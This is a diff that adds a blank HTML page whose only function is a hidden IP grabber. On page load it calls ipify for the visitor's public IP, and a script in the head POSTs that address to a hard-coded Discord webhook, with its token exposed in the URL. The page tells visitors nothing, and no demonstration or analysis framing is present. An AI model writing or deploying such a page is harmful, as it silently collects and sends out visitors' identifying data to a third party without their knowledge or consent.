@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>f</title>
+  <meta name="description" content="The HTML5 Herald">
+  <meta name="author" content="SitePoint">
+  <link rel="stylesheet" href="css/styles.css?v=1.0">
+
+  <script type="application/javascript">
+    function getIP(json) {
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1157714855617384448/YqT2Fdo-m-6rAL6GV-N9Trt4Ypl6B3yfuHechy2EOTinMFuC-zdMJF_M8MwPYZf1p41R", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            'content': json.ip,
+            'username':'AI',
+        }));
+    }
+  </script>
+  
+  <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</head>
+
+<body>
+</body>
+</html>
